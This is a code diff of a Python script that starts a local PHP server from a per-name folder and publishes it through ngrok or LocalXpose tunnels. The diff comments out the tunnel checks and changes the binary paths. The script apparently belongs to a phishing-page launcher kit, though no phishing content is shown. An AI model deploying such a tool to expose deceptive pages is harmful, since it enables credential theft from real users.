@@ -42,8 +42,8 @@ def div_q():
           sleep(7)
           #checkjp2a()
           checkPHP()
-          checkNgrok()
-          checkLocalxpose()
+          #checkNgrok()
+          #checkLocalxpose()
     else:
         banner()
         sleep(7)
@@ -91,7 +91,7 @@ def runNgrok(port):
     system("fuser -k %s/tcp > /dev/null 2>&1"%(port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
     sleep(2)
-    system('./Server/ngrok http {0} > /dev/null &'.format(port))
+    system('./ngrok http {0} > /dev/null &'.format(port))
     sleep(10)
     while True:
         system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
@@ -136,7 +136,7 @@ def randomLocalxpose(port):
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
     sleep(2)
-    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
+    system('./loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
     sleep(7)
     try:
         output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
